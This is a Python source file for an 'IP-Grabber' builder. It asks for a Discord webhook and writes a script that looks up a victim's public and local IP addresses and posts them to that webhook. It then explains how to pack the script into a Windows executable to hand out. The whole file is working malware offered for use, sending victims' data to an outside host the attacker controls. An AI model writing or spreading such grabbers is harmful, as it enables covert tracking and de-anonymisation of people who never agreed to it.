import socket
import requests
import os
import fade
import time

def clear(): # Define the function clear
    os.system('cls || clear') # Clear the programm

# Now, when 'clear()' is call, the programm will be cleared.

banner = """
██╗██████╗        ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██║██╔══██╗      ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║██████╔╝█████╗██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
██║██╔═══╝ ╚════╝██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
██║██║           ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
╚═╝╚═╝            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                          
"""

faded_banner = fade.purpleblue(banner)
print(faded_banner)
webhook = input("Your discord webhook >>") # Associate the webhook variable with your webhook
file_name = input("Your file name >>") # Associate the file_name variable with your file name

code = '''
import socket 
import requests

response = requests.get('http://ifconfig.me/ip')
internet_ip = response.text.strip() # Get the internet ip

local_ip = socket.gethostbyname(socket.gethostname()) # Get the local_ip

data = {
    "embeds": [
        {
            "title": "❗IP GRABBER ❗",
            "color": 32768,
            "fields": [
                {
                    "name": "Adresse IP Internet 📶",
                    "value": f"`{internet_ip}`",
                    "inline": False
                },
                {
                    "name": "Adresse IP Local 🖥️",
                    "value": f"`{local_ip}`",
                    "inline": False
                }
            ]
        }
    ]
} # webhook

requests.post("''' + webhook + '''", json=data) # post the webhook
'''

with open(file_name + '.py', 'w', encoding='utf-8') as file:
    file.write(code)

print("""Your file has been successfully created.

If you want to turn your file into an executable, follow these instructions:
 -> Install auto-py-to-exe :
      -> Open a cmd (Win + R -> cmd)
      -> Type 'pip install auto-py-to-exe'
 -> Open auto-py-to-exe :
      -> In your cmd, just type : 'auto-py-to-exe'
 -> A window will open:
      -> Select your file and select 'one file'
 -> Convert .py to .exe

Open folder and it's completed x)""")

finish = input("Type y if you want to close the ip-grabber. >>")
if finish == 'y':
    exit()
